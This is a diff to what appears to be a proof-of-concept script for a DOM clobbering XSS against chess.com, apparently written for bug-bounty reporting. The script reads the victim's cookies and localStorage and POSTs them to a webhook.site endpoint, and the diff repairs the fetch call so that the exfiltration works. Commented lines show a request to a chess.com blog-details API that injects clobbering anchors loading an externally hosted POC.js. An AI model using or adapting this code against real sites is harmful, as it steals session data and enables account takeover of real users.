@@ -9,14 +9,13 @@ alert("DOM Clobbering XSS by Hussein on: " + document.domain);
 
 var userCookies = document.cookie;
 var userStorage = JSON.stringify(localStorage);
-
 var exfilData = "===== COOKIES =====\n" + userCookies + "\n\n===== LOCAL STORAGE =====\n" + userStorage;
 
-fetch("https://webhook.site/63843b75-5c44-4e91-99c9-564afd8a49ae/"), {
-    method: "POST",    
-    mode: "no-cors",     
-    body: exfilData       
-}
+fetch("https://webhook.site/63843b75-5c44-4e91-99c9-564afd8a49ae/", {
+    method: "POST",
+    mode: "no-cors",
+    body: exfilData
+});
 // const apiUrl = 'https://api.chess.com/rpc/chesscom.user_profile.v1.UserProfileService/SetBlogDetails';
 // const maliciousSidebar = "<p>Hey, check out this cool trick! <a id=\"__tudeConfig\"></a><a id=\"__tudeConfig\" href=\"https://hussein-e4.github.io/POC.js\" name=\"endpoint\"></a></p>";
 // const requestBody = {
